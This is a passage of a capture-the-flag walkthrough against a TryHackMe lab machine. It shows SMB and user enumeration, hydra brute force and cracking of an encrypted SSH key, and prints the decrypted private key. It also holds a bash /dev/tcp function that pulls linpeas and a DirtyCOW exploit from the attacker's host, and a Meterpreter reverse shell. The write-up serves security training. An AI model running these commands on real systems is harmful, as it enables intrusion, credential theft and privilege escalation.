+==================( Users on 10.10.130.167 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[I] Found new SID:
+S-1-22-1
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1001 Unix User\<strong>theodore</strong> (Local User)
+S-1-22-1-1002 Unix User\<strong>automation</strong> (Local User)
+S-1-22-1-1003 Unix User\<strong>simeon</strong> (Local User)
+
+[+] Enumerating users using SID S-1-5-21-1257186002-520694900-3094463090 and logon username '', password ''
+
+S-1-5-21-1257186002-520694900-3094463090-501 <strong>ARATUS\nobody</strong> (Local User)
+S-1-5-21-1257186002-520694900-3094463090-513 <strong>ARATUS\None</strong> (Domain Group)
+```
+
+
+
+
+
+```
+> Found some interesting stuff !
+> Let's check out first the share <strong><em>//10.10.130.167/temporary share</em></strong>
+
+smbclient --no-pass '<strong>//10.10.130.167/temporary share</strong>'
+
+<em><strong>Anonymous login successful</strong></em>
+Try "help" to get a list of possible commands.
+
+smb: \> <strong>ls</strong>
+  .                                   D        0  Mon Jan 10 14:06:44 2022
+  ..                                  D        0  Tue Nov 23 17:24:05 2021
+  .bash_logout                        H       18  Wed Apr  1 04:17:30 2020
+  .bash_profile                       H      193  Wed Apr  1 04:17:30 2020
+  .bashrc                             H      231  Wed Apr  1 04:17:30 2020
+  <strong>.bash_history </strong>                      H        0  Fri Aug  4 21:43:10 2023
+  <strong>chapter1</strong>                            D        0  Tue Nov 23 11:07:47 2021
+  <strong>chapter2 </strong>                           D        0  Tue Nov 23 11:08:11 2021
+ <strong> chapter3 </strong>                           D        0  Tue Nov 23 11:08:18 2021
+ <strong> chapter4 </strong>                           D        0  Tue Nov 23 11:08:25 2021
+  <strong>chapter5</strong>                            D        0  Tue Nov 23 11:08:33 2021
+  <strong>chapter6</strong>                            D        0  Tue Nov 23 11:12:24 2021
+  <strong>chapter7 </strong>                           D        0  Tue Nov 23 12:14:27 2021
+  <strong>chapter8</strong>                            D        0  Tue Nov 23 11:12:45 2021
+  <strong>chapter9</strong>                            D        0  Tue Nov 23 11:12:53 2021
+  <strong>.ssh</strong>                               DH        0  Mon Jan 10 14:05:34 2022
+  <strong>.viminfo</strong>                            H        0  Fri Aug  4 21:43:10 2023
+  <strong>message-to-simeon.txt</strong>               N      251  Mon Jan 10 14:06:44 2022
+
+                37726212 blocks of size 1024. 35590796 blocks available
+```
+
+
+
+
+
+```
+> Hello, maybe a rabit hole? Let's see...
+
+smb: \> <strong>get message-to-simeon.txt</strong>
+getting file \message-to-simeon.txt of size 251 as message-to-simeon.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+
+> Let's download the whole smb-share
+
+smb: \> <strong>mask ""</strong>
+smb: \> <strong>recurse</strong>
+smb: \> <strong>prompt</strong>
+smb: \><strong> mget *</strong>
+
+NT_STATUS_ACCESS_DENIED opening remote file \.bash_history
+NT_STATUS_ACCESS_DENIED opening remote file \.viminfo
+NT_STATUS_ACCESS_DENIED listing \.ssh\*
+```
+
+
+
+
+
+##### command in a nutshell
+
+
+
+
+
+| Command     | Description                                                                                       |
+| ----------- | ------------------------------------------------------------------------------------------------- |
+| **mask ""** | specifies the mask which is used to filter the files within the directory (e.g. "" for all files) |
+| **recurse** | toggles recursion on (default: off)                                                               |
+| **prompt**  | toggles prompting for filenames off (default: on)                                                 |
+| **mget \*** | copies all files matching the mask from host to client machine                                    |
+
+SMB download complete share
+
+
+
+
+
+---
+
+
+
+
+
+##### WAPITI
+
+
+
+
+
+```
+<strong>wapiti -u http://10.10.130.167/ -m all</strong>
+```
+
+
+
+
+
+```
+     __      __               .__  __  .__________
+    /  \    /  \_____  ______ |__|/  |_|__\_____  \
+    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
+     \        /  / __ \|  |_> >  ||  | |  |/       \
+      \__/\  /  (____  /   __/|__||__| |__/______  /
+           \/        \/|__|                      \/
+Wapiti-3.0.4 (wapiti.sourceforge.io)
+[*] <strong>Today is International Beer Day!</strong>
+[*] Saving scan state, please wait...
+
+ Note
+========
+This scan has been saved in the file /home/anyguy/.wapiti/scans/10.10.130.167_folder_812777d9.db
+[*] Wapiti found 1 URLs and forms during the scan
+[*] Loading modules:
+         backup, blindsql, brute_login_form, buster, cookieflags, crlf, csp, csrf, exec, file, htaccess, http_headers, methods, nikto, permanentxss, redirect, shellshock, sql, ssrf, wapp, xss, xxe
+
+[*] Launching module crlf
+
+[*] Launching module csp
+CSP is not set
+
+[*] Launching module http_headers
+Checking X-Frame-Options :
+<strong>X-Frame-Options is not set</strong>
+Checking X-XSS-Protection :
+<strong>X-XSS-Protection is not set</strong>
+Checking X-Content-Type-Options :
+<strong>X-Content-Type-Options is not set</strong>
+Checking Strict-Transport-Security :
+<strong>Strict-Transport-Security is not set</strong>
+
+[*] Launching module csrf
+
+[*] Launching module cookieflags
+
+[*] Launching module exec
+
+[*] Launching module file
+
+[*] Launching module sql
+
+[*] Launching module xss
+
+[*] Launching module backup
+
+[*] Launching module brute_login_form
+
+<strong>[*] Launching module htaccess</strong>
+---
+<strong>Weak restriction bypass vulnerability: http://10.10.130.167/
+HTTP status code changed from 403 to 501</strong>
+---
+
+[*] Launching module nikto
+---
+Apache default file found.
+<strong>http://10.10.130.167/icons/README</strong>
+References:
+  https://vulners.com/osvdb/OSVDB:3233
+---
+
+[*] Launching module buster
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FEROXBUSTER - WEBFUZZING 2.0
+
+
+
+
+
+```
+<strong>feroxbuster -u http://10.10.130.167/ -w /usr/share/wordlists/dirb/big.txt -d 0 -x php,txt,html,bak,js,docx,pdf,json,bat,cmd,ps1,sh</strong>
+```
+
+
+
+
+
+```
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.130.167/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html, bak, js, docx, pdf, json, bat, cmd, ps1, sh]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ INFINITE
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+
+200      GET        7l      340w    19341c http://10.10.130.167/noindex/css/bootstrap.min.css
+200      GET        6l       51w     3487c http://10.10.130.167/images/apache_pb.gif
+200      GET       28l      100w     7010c http://10.10.130.167/images/poweredby.png
+200      GET      132l      307w     5081c http://10.10.130.167/noindex/css/open-sans.css
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### WFUZZ - SUBDOMAIN ENUMERATION
+
+
+
+
+
+```
+<strong>wfuzz -c --hc 400,404,403 -u 10.10.130.167 -H "Host: FUZZ.10.10.130.167" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt</strong>
+```
+
+
+
+
+
+```
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.130.167/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114441
+Requests/sec.: 0
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### WEAPONIZATION
+
+
+
+
+
+##### FTP / PORT 21
+
+
+
+
+
+```
+
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### SMB / PORT 139, 445
+
+
+
+
+
+```
+
+```
+
+
+
+
+
+##### Message-To-Simeon.txt
+
+
+
+
+
+```
+<strong>Simeon</strong>,
+
+Stop messing with your home directory, you are moving files and directories insecurely!
+<strong>Just make a folder in /opt for your book project...</strong>
+
+<strong>Also you password is insecure</strong>, could you please change it? <strong>It is all over the place now!</strong>
+
+- <strong>Theodore</strong>
+```
+
+
+
+
+
+##### What Else Do We Have In The Share
+
+
+
+
+
+```
+<strong>ls -la </strong>
+
+total 72
+drwxr-xr-x 13 anyguy anyguy 4096 Aug  4 22:46 .
+drwxr-xr-x 13 anyguy anyguy 4096 Aug  4 16:33 ..
+-rw-r--r--  1 anyguy anyguy   18 Aug  4 22:46 .bash_logout
+-rw-r--r--  1 anyguy anyguy  193 Aug  4 22:46 .bash_profile
+-rw-r--r--  1 anyguy anyguy  231 Aug  4 22:46 .bashrc
+drwxr-xr-x  5 anyguy anyguy 4096 Aug  4 22:46 chapter1
+drwxr-xr-x  7 anyguy anyguy 4096 Aug  4 22:46 chapter2
+drwxr-xr-x  6 anyguy anyguy 4096 Aug  4 22:46 chapter3
+drwxr-xr-x  6 anyguy anyguy 4096 Aug  4 22:46 chapter4
+drwxr-xr-x  4 anyguy anyguy 4096 Aug  4 22:46 chapter5
+drwxr-xr-x  5 anyguy anyguy 4096 Aug  4 22:46 chapter6
+drwxr-xr-x  4 anyguy anyguy 4096 Aug  4 22:46 chapter7
+drwxr-xr-x  6 anyguy anyguy 4096 Aug  4 22:46 chapter8
+drwxr-xr-x  7 anyguy anyguy 4096 Aug  4 22:46 chapter9
+-rw-r--r--  1 anyguy anyguy  251 Aug  4 22:46 message-to-simeon.txt
+-rw-r--r--  1 anyguy anyguy  354 Aug  4 22:42 notes.md
+drwxr-xr-x  2 anyguy anyguy 4096 Aug  4 21:45 scans
+drwxr-xr-x  2 anyguy anyguy 4096 Aug  4 22:46 <strong>.ssh</strong>
+
+<strong>cd .ssh
+ls -la</strong>
+total 8
+drwxr-xr-x  2 anyguy anyguy 4096 Aug  4 22:46 .
+drwxr-xr-x 13 anyguy anyguy 4096 Aug  4 22:46 ..
+```
+
+
+
+
+
+```
+> Since I always search for the easy way and I don't want to check every file in every subdirectory - get my script on github, which shows you the uniq files.
+
+Unique content found in /home/anyguy/Documents/TryHackMe/CTF/Aratus/smb/<strong>chapter7/paragraph7.1/text2.txt</strong>
+```
+
+
+
+
+
+
+
+[Get My Script on GitHub !](https://github.com/trustinveritas/pentest-project-site/blob/17ebd5d71bf9522b1319e453f4ac85f5a6cbb32d/FORENSIC/Analyze/analyze-files-and-show-files-with-not-the-same-data.py#L40)
+
+
+
+
+
+
+
+---
+
+
+
+
+
+#### EXPLOITATION
+
+
+
+
+
+##### HYDRA - BRUTEFORCE SSH / Port 22
+
+
+
+
+
+```
+<strong>hydra -l simeon -P /usr/share/wordlists/rockyou.txt ssh://10.10.130.167</strong>
+```
+
+
+
+
+
+```
+<em>=== No Result ===</em>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### HYDRA - BRUTEFORCE FTP / Port 21
+
+
+
+
+
+```
+<strong>hydra -l simeon -P /usr/share/wordlists/rockyou.txt -t 10 -v -f -e nsr ftp://10.10.130.167</strong>
+```
+
+
+
+
+
+```
+<em>=== No Result ===</em>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### CRACK ENCRYPTED RSA PRIVATE KEY
+
+
+
+
+
+```
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,596088D0C0C3E6F997CF39C431816A88
+
+5t3gTvBBx3f871Au/57hicjw646uQzz+SOfHtmUGL8IvojzDAgC72IX20qg717Dl
+xD+jjENQUEB60dsEbPtzc9BatTZX6kQ9B0DXVEY63v/8wHb4Aq6g5WwgGNH6Nq6y
+hIpylfVflBTnYpdSSIHnTdqzgzzHuOotLGoQJOrwO8IvmdlId7/dqpLgCY6jQMB8
+nYYbkwwcyXcyt7ouZNfb3/eIp6afHW8g9cC2M9HIYLAtEIejxmcCqF2XjYIekZ/L
+TI5EVrPOnLZeT5N6byAtODlIPJyJRE3gIiS1tTPxxOjBl6/7lEDQ49eIz5mCHxOz
+BrIfgjaTRTPC1G6b+QAS9S1dleqNE4j5+FUsYpJDLan+WCgGc6oFgBjTTz96UB7M
+qduRY8O+bW36OJhQh3hCxfZevCSa5ug6hH+q43XP0O9UkUL8U4/1dFLa4RI9cjIK
+D3ythFCQUzT4RKMoW+F1528Fhro0lPRgc6XfhJu/zs3gr6yIiaolIE+YVOB92IBx
+Xu6kBRLPct6Gj7lFSnISYa+Vu5UyQNUNP+Ezk9GgeK/PGwMd2sfLW79PKyhl4iXZ
+ymkbHWAfgHk+kmY/+EPgdgf9VyglYOjx5hBopEpPlfuZb/X/PZTO8CYxltYHiJtn
+FCjnVV9rH6oUBgaA2yspo22OEi8QdSoGzUrz9TgdStxls20vTuYuwll8rhyZu7OR
+ehXskDrvxAnptNzHyLjj800W4/X7jUltuA3jfvEYLGFeLyeP3Cg/IFnXbv+4H3ca
+TxTnFUNY9t8DsnYiaHgbKTx7XpVwGATI+Wn3cT558xIvPhipge2lso5d0KTLP2Nn
+kLlwlcSQp393GvUlJ7e9Gd1KkoZvk6wxjWB0ZxOSte/HJJooXfNF7/8p3v9Y++iX
+NVNA/vu4o8C8TfKgq91cm+j13s/WNV1g8TXqbI9TU/YW4ZEEeemJFA0hd0eQvZvR
+C4z/qJZH8MhBB6VIVn4l0uhNKHehaZCoGUtR28IzIctz96CJnwl3DbMKWX8c7mx0
+s+1rJAjjcKxFS7lxPiCID6j/hZvsdjXnPScH2e/lQ1bMUk2rOCsDKCKeY0YGCkvI
+H51/oW3qCjUx7Rtnf8RKu16uMDMBqDFYc795QoFmz9SAe7tCHmtKyZw1rI8x4G2I
+rzptsqT3tW+hMrlqBM8wxksKfnhQE8h06tJKSusv12BabgkCNuk9CuD9D7yfgURI
+hKXIf7SYorLBo7aBDXxwPZzanqNPsicL03Pbcv6LK18nubBd4nN9yLJB7ew0Q2WC
+d19y9APjMKqoOUkXFtVhUFH5RQH7cDzoK1MZEZzMG7DKs496ZkDXxNJP6t5LiGmi
+LIGlrXjAbf/+4/2+GNmVUZ+7xXhtM08hj+U5W0StmD7UGa/kVbwsdgBoUztz91wC
+byotvP69b/oQBbzs/ZZSKJlAu2OhNGgN1El4/jhCHWcs5+1R1tVcAbZugdvPH2qK
+rTePu5Dh58RV3mdmw7IyxdRzD95mp7FOnw6k+a7tZpghYLnzHH6Xrpor28XZilLT
+aWtaV/4FhBPopJrwjq5l67jIYXILd+p6AXTZMhJp0QA53unDH8OSSAxc1YvmoAOV
+-----END RSA PRIVATE KEY-----
+```
+
+
+
+
+
+##### JOHN THE RIPPER
+
+
+
+
+
+```
+> Create the hash file for John The Ripper
+
+<strong>ssh2john id_rsa.encrypted > id_rsa.hash</strong>
+```
+
+
+
+
+
+```
+> Let's try our luck !
+
+<strong>john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash</strong>
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 20 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<strong>redacted      (id_rsa.encrypted)  </strong>
+1g <strong>0:00:00:00 DONE</strong> (2023-08-04 23:36) 9.090g/s 613818p/s 613818c/s 613818C/s xavier07..swettie
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+
+
+
+
+```
+> Wow this was fast and super easy password !
+```
+
+
+
+
+
+> 
+>
+> **_"Keep your friends close, your enemies closer, and your weak passwords even closer. After all, they're the ones who open all your doors!"_**
+>
+> 
+>
+> trustinveritas
+
+
+
+
+
+---
+
+
+
+
+
+#### CREDENTIAL ACCESS
+
+
+
+
+
+##### CONNECT TO SSH WITH KEY
+
+
+
+
+
+```
+> Set the appropriate rights for the ssh key
+
+<strong>chmod 600 id_rsa.encrypted</strong>
+```
+
+
+
+
+
+```
+> Access the machine
+
+<strong>ssh -i id_rsa.encrypted simeon@10.10.130.167</strong>
+
+There were <em><strong>1518 failed</strong></em> login attempts since the last successful login.
+Last login: Mon Jan 10 14:07:52 2022 from 172.16.42.100
+<strong>[simeon@aratus ~]$ </strong>
+
+> Our Bruteforce was noisy as hell !
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### WEAPONIZATION
+
+
+
+
+
+##### linPEAS
+
+
+
+
+
+```
+> Let's get our good old friend for Privilege Escalation on to the target
+
+<strong>cd /tmp</strong>
+
+
+> On our machine, let's host a simple python http server
+
+<strong>sudo python3 -m http.server 80</strong>
+
+
+> Download the script to the target
+
+<strong>wget http://YOUR-IP/linpeas.sh</strong>
+-bash: wget: command not found
+
+> No wget, no Problem !
+```
+
+
+
+
+
+##### If wget and curl doen't exist...
+
+
+
+
+
+```
+> Copy & Paste this code into the terminal
+
+> This will give us a function like curl
+```
+
+
+
+
+
+```
+function __curl() {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+```
+
+
+
+
+
+```
+> Now use the command to download your file
+<strong>
+__curl http://YOUR-IP/linpeas.sh</strong> <strong>> linpeas.sh</strong>
+```
+
+
+
+
+
+```
+> Give rights to execute it
+
+<strong>chmod +x linpeas.sh</strong>
+
+
+> Let's find the vulnerabilities !
+
+<strong>./linpeas.sh</strong>
+```
+
+
+
+
+
+```
+> linPEAS findings
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
+/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:<strong>/home/simeon</strong>/.local/bin:<strong>/home/simeon</strong>/bin
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester
+<strong>[+] [CVE-2016-5195] dirtycow</strong>
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   <strong>Exposure: highly probable</strong>
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},[ RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7} ],ubuntu=16.04|14.04|12.04
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+<strong>[+] [CVE-2016-5195] dirtycow 2</strong>
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   <strong>Exposure: highly probable</strong>
+   Tags: debian=7|8,[ RHEL=5|6|7 ],ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp    LISTEN     0      50        *:139                   *:*
+tcp    LISTEN     0      128       *:22                    *:*
+<strong>tcp    LISTEN     0      100    127.0.0.1:25</strong>                    *:*
+
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strace Not Found
+-rws--x--x. 1 root root 24K Feb  2  2021 /usr/bin/chfn  --->  SuSE_9.3/10
+-rws--x--x. 1 root root 24K Feb  2  2021 /usr/bin/chsh
+-rwsr-xr-x. 1 root root 44K Feb  2  2021 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x. 1 root root 73K Aug  9  2019 /usr/bin/chage
+-rwsr-xr-x. 1 root root 77K Aug  9  2019 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root 41K Aug  9  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x. 1 root root 32K Feb  2  2021 /usr/bin/su
+-rwsr-xr-x. 1 root root 32K Feb  2  2021 /usr/bin/umount  --->  BSD/Linux(08-1996)
+---s--x--x. 1 root root 148K Oct 14  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+<strong>-rwsr-xr-x. 1 root root 28K Jan 25  2022 /usr/bin/pkexec</strong>  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+
+══╣ Parent process capabilities
+Files with capabilities (limited to 50):
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+<strong>/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip</strong>
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/simeon/.viminfo
+/root/
+/var/www
+<strong>/var/www/cgi-bin</strong>
+<strong>/var/www/html</strong>
+/var/www/html/test-auth
+<strong>/var/www/html/test-auth/.htpasswd
+/var/www/html/test-auth/index.html</strong>
+<strong>/var/www/html/simeon</strong>
+/var/www/html/simeon/style.css
+/var/www/html/simeon/chapter1.html
+/var/www/html/simeon/chapter2.html
+/var/www/html/simeon/chapter3.html
+/var/www/html/simeon/chapter4.html
+/var/www/html/simeon/chapter5.html
+/var/www/html/simeon/chapter6.html
+/var/www/html/simeon/chapter7.html
+/var/www/html/simeon/chapter8.html
+/var/www/html/simeon/chapter9.html
+<strong>/var/www/html/simeon/index.html</strong>
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/simeon
+<strong>/run/user/1003</strong>
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas.sh
+```
+
+
+
+
+
+```
+> So what do we have here ?
+> First the best PE vectors
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-<strong>/home/simeon/.local/bin:/home/simeon/bin</strong>
+
+══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester
+<strong>[+] [CVE-2016-5195] dirtycow
+[+] [CVE-2016-5195] dirtycow 2</strong>
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+══╣ Parent process capabilities
+<strong>/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### DELIVERY
+
+
+
+
+
+```
+> Let's make everything ready
+> First decrypt the rsa key
+
+<strong>openssl rsa -in id_rsa.encrypted -out id_rsa</strong>
+
+> Go to ARMITAGE C2 Framework
+> Search for: <strong><em>ssh_login_pubkey</em></strong>
+> Drag and Drop to the client
+> set KEY_PATH to the decrypted rsa key, whole path !
+> set USERNAME simeon
+> Launch
+
+[*] Auxiliary module running as background job 2.
+[*] 10.10.130.167:22 SSH - Testing Cleartext Keys
+[*] 10.10.130.167:22 - Testing 1 key from /home/anyguy/Documents/TryHackMe/CTF/Aratus/id_rsa
+[+] 10.10.130.167:22 - Success: 'simeon:-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyEN/MJEoZmMhkXAmX6rgoFQkH19pCncKe5ah0Z51i3NEvxvY
+aasFzkBPW9mNLpMfb83udcVOSbDnSwpIonZKZ0N/O7N7571DKYznxWq6IaIse75m
+Xp2m2qu1cS8uQ1/qF3LPTVg/NyTjMheJ3h0fCb6ClzuRVXCoyUkOCltiWmwGrVSs
+2gJtoi+ekysxqe24Z+UiGP9zuC/Lf9fc/mN8sg73eGyjVKd1hPQrXp7AexHJGMHy
+fMXIl51fgG/HcsRvw+LtPGQl5r7VOjVrrjyZo8Q8bhLm098MOfAE+3FC8MBN7dSA
+jmjvCKrKimqIAFFQOeHrjGO/UDuxifp6ajF/+QIDAQABAoIBADLfMogb169qrzRK
+0PSsa7NOrH5rtjs6Uidi9GhTYHi0J1qEsEznbOof3AjxErQqG2pDXbf9Dw4ZKigd
+zKW4dt4Uf1WjGm6b3VvIt3emzPGOSM6GZ2rRkXkq9URzP8VNsCGUwKRdLnHLpQss
+f5E0xJWtF29jal/R5o57SF3JKQrewydG7DnV2oQOxs9CnmnECjVX/AatSC4Eizz5
+qo/6JQ+v00uBIOF7j8K6lZ1ken8bRFdUAHOhiT8BssLOHWxTe5i8kGZL4QgFBMfe
+9Ww1u2PUJ0ttIXe+Tvoa9n8kUT/UOF5iloREZYlkfRobhI0Pf7E4mEKhexpUBNdv
+zSjXzAECgYEA5a4EyeNeNXfGfnjxQERbgbJUjqi1dqNhGJHhq0t85EqSdvNV3hJg
+WGCpiIleSLful26gnX6Pw/wgYQtVdcWZ8RCym2/0fdHTNMDbDw1tvcRtbjUIyO9J
+vb89IXbyoXfzmiplq11zvOQ+ftlzf8mfgvFBupfPFHgcFBbZhpWkirECgYEA3zaD
+3oXs2yKEg6dtxOt/8irEWGkiRXzuS5I877xse/V/KZ49VKhQca5nijrVEzOcMMN3
+cqVckhHJPOGXTTXTJ0reAM8TpkytbdaqfO7gNeW+NynXHLX2gqHpYFkmLMmJxwmB
+8rutU2QdduRgepx9sTl9ejlxpGOEIiH9FWd7C8kCgYBx5+msDjzMm4gvdN+AleYj
+3kMdNQI5wjEHNGIMx7U6qtkUcP2m0spBSj8J3caKnd2P8GdrdDbsZX/RYQOTEtqT
+uUo62D0SoRrz0KlTP7+rG12CCH9A15tkpRE2JX2TIqAHVvtxDzm09iUgV8t2FpIr
+KGcGmP80EZUrSWG74z7lIQKBgQCnTvJrAdF2s5nGIOI7XxXpC7teVXd1xF3NUVDR
+lVdvVqU5Kb3ozbx2aXZ8evqpSN8DAhBvY5lOd3xyYNmK6xRZeFmNG6or1X+NPAFQ
+YbC3VXxNVtRBVfbvFbObH1do7KuUAAFiUuBpCDq5mhbi8JeaFnCCA7q1sE4jU3yi
+5YyqWQKBgQDWPgaxK5C4k99lEJsOnqhcvxos+LI2vGs3mLfSnsYQYH3LvfxywEN1
+jPJorqC4ixVnhZ67t5fAdUnt795Krzjp5DSS4ZJYPXTlZLmqDPm5pf7AHSb265P2
+y4zyomVA4qloIkY3ao+FYEK2qnwNxhhfShCmKAwS9Lz5ESjhJCjOBg==
+-----END RSA PRIVATE KEY-----
+' 'uid=1003(simeon) gid=1003(simeon) groups=1003(simeon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux aratus 3.10.0-1160.59.1.el7.x86_64 #1 SMP Wed Feb 23 16:47:03 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
+<strong>[*] SSH session 1 opened </strong>(10.11.8.178:45161 -> 10.10.130.167:22) at 2023-08-05 00:35:41 +0200
+[*] Scanned 1 of 1 hosts (100% complete)
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+![](./img/wp-content-uploads-2023-08-compromised.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+```
+> Shell to Meterpreter
+
+> Right click on the compromised host > <strong><em>Shell1</em></strong> > <em><strong>Interact</strong></em>
+> Search for:<strong><em> shell_to_meterpreter</em></strong>
+> Drag and Drop
+> Launch
+
+[*] Post module running as background job 4.
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on **.**.**.**:4433
+[*] Sending stage (24772 bytes) to 10.10.130.167
+<strong><em>[*] Meterpreter session 2 opened</em></strong> (**.**.**.**:4433 -> 10.10.130.167:47762) at 2023-08-05 00:42:52 +0200
+[*] Stopping exploit/multi/handler
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+> Now we have:
+  - SSH Shell
+  - Meterpreter Shell
+
+> Let's compile our dirtycow exploit !
+```
+
+
+
+
+
+
+
+[Get the Exploit from GitHub !](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679)
+
+
+
+
+
+
+
+```
+> Compile it static so you don't get GLIBC errors
+<strong>
+gcc -pthread -static -o cowroot cowroot.c</strong>
+
+> Download it to the target machine, same way like linpeas.sh
+
+<strong>__curl http://YOUR-IP/cowroot > cowroot</strong>
+<strong>chmod +x cowroot</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### EXPLOITATION
+
+
+
+
+
+##### Writable PATH abuses
+
+
+
+
+
+```
+> If you find that you can write inside some folder of the $PATH you may be able to escalate privileges by creating a backdoor inside the writable folder with the name of some command that is going to be executed by a different user (root ideally) and that is not loaded from a folder that is located previous to your writable folder in $PATH.
+
+> But we need a SUID, so for the moment we can't use it
+```
+
+
+
+
+
+##### DirtyCOW
+
+
+
+
+
+```
+> If you get this
+
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 27856
+Racing, this may take a while..
+<strong>thread stopped
+thread stopped</strong>
+
+
+> It's not working...
+```
+
+
+
+
+
+##### BACK TO LINPEAS
+
+
+
+
+
+```
